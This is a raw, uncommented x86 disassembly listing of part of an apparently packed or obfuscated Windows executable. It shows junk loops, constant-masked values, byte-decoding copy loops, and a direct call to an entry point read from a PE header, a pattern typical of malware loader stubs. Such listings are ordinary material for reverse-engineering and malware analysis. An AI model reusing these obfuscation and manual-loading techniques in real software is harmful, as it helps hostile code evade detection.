  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x423992
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c66
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e82
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c66
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42385f
  41bc20:	push   0x423893
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e82,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c66
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x4238de
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x423893
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423956
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c66
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421aea,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d3e,eax
  41c15b:	mov    eax,ds:0x421aea
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c66
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d3e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421aea
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c66
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c66
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c66
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cea,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421ce2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c66
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237f2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a96
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
